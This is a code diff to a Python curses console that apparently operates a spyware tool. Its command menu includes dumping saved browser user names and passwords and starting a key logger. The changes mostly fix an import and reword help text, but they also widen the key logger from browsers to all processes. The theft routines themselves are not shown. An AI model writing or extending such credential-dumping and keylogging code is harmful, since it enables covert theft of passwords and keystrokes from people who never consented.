@@ -19,7 +19,7 @@ from clint.network import net_time
 from logger import add_curses_handler, log
 from rpyc import connect
 
-import .drive as _d
+from . import drive as _d
 from .drive import backup, drive, drive_file, move_file, source_drive
 from .util import data_store, force_stop
 
@@ -613,7 +613,7 @@ atexit.register(token_provider.stop)
 
 class Option_view:
     def __init__(self, opt_lst, opt_win=window):
-        self.opt_lst=opt_lst
+        self.opt_lst:dict=opt_lst
         self.opt_win=opt_win
         self.opt_win.keypad(True)
 
@@ -774,8 +774,8 @@ class action:
         self.all_command=OrderedDict({
             "dump": [self.dump, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
             "stored_value": [self.stored_value, 'check all the key-value stored in data_store. [reports: data_store_(time).json]', ],
-            "set_value": [self.set_value, "change a value of stored key in data_store.", ],
-            "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump_(time).log]', ],
+            "set_value": [self.set_value, "change a value of stored key in data_store. changing command secquence (user_time) is highly discaraged. ", ],
+            "start_logger": [self.start_logger, 'start a browser spacefic key logger. Enter without seleting anything for logging all process including and excluding browsers [reports: key_dump_(time).log]', ],
             "discard": [self.discard, "discard staged commands."],
             "clean_recoed":[self.clean_record, "remove user name with all listed commands from command file  but it doesn\'t discard the staged commands."]
         })
@@ -852,7 +852,7 @@ class action:
         if not selected:
             return
         
-        selected = selected or browsers
+        selected = selected or None# none for all process including and excluding browsers
         
         clear()
         middle_print_str(window, "set max size of Key log (default:3) in MB :")
